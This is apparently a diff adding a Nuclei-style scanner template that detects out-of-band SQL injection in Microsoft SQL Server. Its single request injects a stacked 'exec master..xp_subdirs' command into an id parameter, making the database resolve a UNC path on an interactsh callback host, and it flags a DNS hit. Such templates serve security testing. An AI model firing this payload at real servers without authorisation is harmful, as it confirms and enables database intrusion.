@@ -1,0 +1,18 @@
+id: mssql-oob-xp-subdirs
+
+info:
+  name: MSSQL OOB via xp_subdirs
+  severity: critical
+  author: reewardius
+  tags: sqli,oob,mssql
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\test'--"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
